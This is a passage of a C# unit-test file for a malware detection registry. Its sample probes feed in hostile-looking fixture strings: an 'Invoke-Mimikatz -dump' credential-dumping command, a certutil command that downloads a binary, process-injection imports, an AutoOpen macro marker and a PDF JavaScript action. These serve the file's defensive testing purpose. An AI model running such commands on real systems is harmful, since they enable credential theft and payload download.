            foreach (var finding in registry.Inspect(probe, CancellationToken.None))
            {
                produced.Add(finding.RuleId);
            }
        }

        foreach (var id in produced)
        {
            Assert.Contains(id, documented);
        }
    }

    [Fact]
    public void Registry_assesses_findings_with_a_transparent_breakdown()
    {
        var registry = DetectorRegistry.CreateDefault();
        var findings = registry.Inspect(
            FileProbe.FromText("run.ps1", "Invoke-Mimikatz -dump"),
            CancellationToken.None);

        var assessment = registry.Assess(findings);

        Assert.NotEmpty(assessment.Signals);
        Assert.Contains("script.credential-theft", assessment.BuildDetail(), StringComparison.Ordinal);
    }

    private static IEnumerable<FileProbe> SampleProbes()
    {
        yield return FileProbe.FromText("run.ps1", "Invoke-Mimikatz -dump; New-Service -Name x -DisplayName y");
        yield return FileProbe.FromText("fetch.cmd", "certutil -urlcache -split -f https://example.invalid/a.bin");
        yield return FileProbe.FromBytes("packed.exe", DetectionFixtures.PeImage(new PeImageOptions
        {
            Sections = [new PeSectionSpec("UPX0", DetectionFixtures.HighEntropyBytes(4096), 0xC000_0040)],
            Imports = [new PeImportSpec("KERNEL32.dll", ["VirtualAlloc", "WriteProcessMemory"])]
        }));
        yield return FileProbe.FromBytes("invoice.doc", DetectionFixtures.OleCompoundFile(Encoding.ASCII.GetBytes("AutoOpen")));
        yield return FileProbe.FromBytes("form.pdf", DetectionFixtures.Pdf("/Type /Action /S /JavaScript"));
        yield return FileProbe.FromBytes("bundle.zip", DetectionFixtures.Zip(new ZipEntrySpec("setup.exe", new byte[] { 0x4D, 0x5A })));
        yield return FileProbe.FromBytes("run.lnk", DetectionFixtures.Shortcut(@"C:\Windows\System32\wscript.exe"));
        yield return FileProbe.FromBytes("blob.bin", DetectionFixtures.HighEntropyBytes(8192));
        yield return FileProbe.FromBytes("eicar.com", TestData.EicarBytes());
    }

    private static SignatureEngine EngineFromJson(string json)
    {
        var result = SignatureEngine.Parse(json, "test");
        Assert.True(result.Ok, result.Problem ?? "The rule file could not be parsed.");
        return new SignatureEngine(result.RuleSet!);
    }

    private static Finding Finding(string ruleId, string title) => new()
    {
        RuleId = ruleId,
        Title = title,
        Category = FindingCategory.Heuristic,
        Confidence = Confidence.Medium,
        Summary = "test summary",
        Detail = "test detail",
        Advice = "test advice"
    };

    private static byte[] ValidCertificate()
    {
        // A WIN_CERTIFICATE structure that starts with the PKCS#7 signed-data marker.
        var oid = new byte[] { 0x06, 0x09, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x01, 0x04 };
        var certificate = new byte[8 + oid.Length + 16];
        certificate[4] = 0x00;
        certificate[5] = 0x02;
        certificate[6] = 0x02;
        certificate[7] = 0x00;
        oid.CopyTo(certificate, 8);
        return certificate;
    }

    private sealed class FixedShortcutResolver(bool exists) : IShortcutTargetResolver
    {
        public bool? TargetExists(string target) => exists;
    }
}
